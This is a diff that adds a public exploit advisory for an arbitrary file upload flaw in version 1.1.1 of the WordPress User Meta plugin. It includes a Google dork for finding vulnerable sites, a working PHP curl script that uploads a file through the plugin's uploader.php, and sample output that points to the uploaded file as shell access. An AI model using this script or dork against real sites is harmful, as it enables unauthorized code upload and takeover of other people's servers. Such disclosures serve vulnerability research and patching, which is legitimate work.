@@ -1,0 +1,33 @@
+###########################################################
+#
+# Exploit Title: Wordpress User Meta Version 1.1.1 Arbitrary File Upload
+# Google Dork: inurl:wp-content/plugins/user-meta/framework/helper/
+# Date: 11/06/2012
+# Exploit Author: Adrien Thierry
+# Vendor Homepage:  http://user-meta.com/
+# Software Link: http://downloads.wordpress.org/plugin/user-meta.1.1.1.zip
+# Version: 1.1.1
+#
+###########################################################
+
+Vuln page : http://mysite.com/wp-content/plugins/user-meta/framework/helper/uploader.php
+
+exploit :
+
+<?php
+$u="C:\Program Files (x86)\EasyPHP-5.3.9\www\info.php.jpg";
+$c = curl_init("http://127.0.0.1/wp/wp-content/plugins/user-meta/framework/helper/uploader.php");
+curl_setopt($c, CURLOPT_POST, true);
+curl_setopt($c, CURLOPT_POSTFIELDS,
+array('qqfile'=>"@$u"));
+curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
+$e = curl_exec($c);
+curl_close($c);
+echo $e; 
+?>
+
+Shell access : Shown in result of exploit
+	ex : {"success":true,"fieldname":null,"filepath":"\/2012\/06\/1339356494.jpg"}
+		access : http://mysite.com/wp-content/uploads/2012/06/1339356494.jpg
+		
+#####################################################################
